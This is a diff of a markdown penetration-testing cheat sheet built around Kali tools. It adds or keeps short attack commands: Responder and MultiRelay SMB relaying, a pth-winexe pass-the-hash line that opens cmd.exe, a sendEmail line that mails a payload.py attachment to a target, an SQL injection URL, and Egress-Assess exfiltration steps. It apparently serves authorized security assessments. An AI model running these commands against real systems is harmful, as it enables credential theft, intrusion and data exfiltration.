@@ -41,25 +41,16 @@ Create a new Advanced Scan
 
 ### SimplyEmail
 ### theHarvester
-To run theHarverster. 
-```
-theHarverster
-```
-Show options:
-```
-theHarverster options
-```
-theharvester Usage Example
-```
-theharvester -d kali.org -l 500 -b google
-```
-
 ## Web Application Reconnaissance
 ### Vega
+Open Vega by selecting the icon from the sidebar or menu in Kali.
 ### Acunetix
 ### Burp Suite
 ### Nessus
 ### Nikto
+```
+nikto -h "ip address"
+```
 ### Nmap Scripting Engine
 
 ## Payload Generation
@@ -96,11 +87,9 @@ Now you can Generate the payload.
 
 ```
 sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
-123.123.123.2:25 -u foo -a payload.py -m Click Me
+123.123.123.?:25 -u foo -a payload.py -m Click Me
 ```
 
-## Data Exfiltration
-### Egress-Assess
 
 ## Enumeration
 ### PowerSploit
@@ -113,7 +102,8 @@ sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
 ### DirBuster
 ### Gobuster
 
-## Exploitation
+## Exploitation/Privilege Escalation
+### PowerSploit
 ### Burp Suite
 ### Metasploit
 ### SearchSploit
@@ -138,8 +128,34 @@ http://site/name.php?henryearl=-1'
 ```
 [Thanks to Database Tutorials](https://www.youtube.com/watch?v=oWHKIiRGjtQ)
 
-## Pass the Hash
+## Password Attacks
+### hashcat
+### Hydra
+### Kerberoast
+### mimikatz
+### Responder
+Machines that don’t require SMB signing are vulnerable to SMB relaying.
+```
+responder -v -I eth0
+```
+### MultiRelay
+
+Run from the "usr/share/responder/tools" directory: 
+```
+./MultiRelay.py -t 10.10.10.10 -u “Jane Doe"
+```
+Use the Available Commands after connection for interation options.
+```
+Available commands
+```
+
+### samdump2
 ### pth-winexe
 Pass the Hash of a user and open a cmd shell. 
 ```
 pth-winexe -u administrator%"hash"//"target ip" cmd.exe
+```
+
+## Data Exfiltration
+### Egress-Assess
+In order to fulfill the data exfiltration service of an assessment, a tool called Egress-Assess is used. On the designated Egress-Assess server (the external Egress-Assess Kali machine) navigate to ~/Tools/Egress-Assess and run ‘Egress-Assess.py --server <protocol>’ (for ftp and smtp protocols, specify a --username and --password that the client can use to connect and be sure to indicate those on the client as well).
